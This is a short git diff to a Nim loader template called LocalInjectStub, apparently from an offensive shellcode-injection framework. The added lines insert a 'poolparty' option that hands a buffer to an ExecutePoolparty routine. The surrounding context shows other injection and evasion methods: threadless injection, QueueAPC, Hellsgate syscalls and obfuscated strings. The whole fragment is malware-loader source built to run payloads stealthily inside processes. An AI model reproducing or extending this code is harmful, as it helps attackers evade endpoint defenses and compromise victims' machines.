@@ -585,6 +585,12 @@ let LocalInjectStub*  = """
                 echo obf("[*] Calling threadlessFunction")
             var threadlessFuncSuccess: bool = ThreadlessFuncPtr(-1, nil, nil)
 
+        when defined(poolparty):
+            when defined(JmpEntry):
+                buffer = newEntry
+            ExecutePoolparty(-1, buffer)
+            return
+
         when defined(QueueAPC):
             var tHandle: HANDLE = -2
             when defined(Hellsgate):
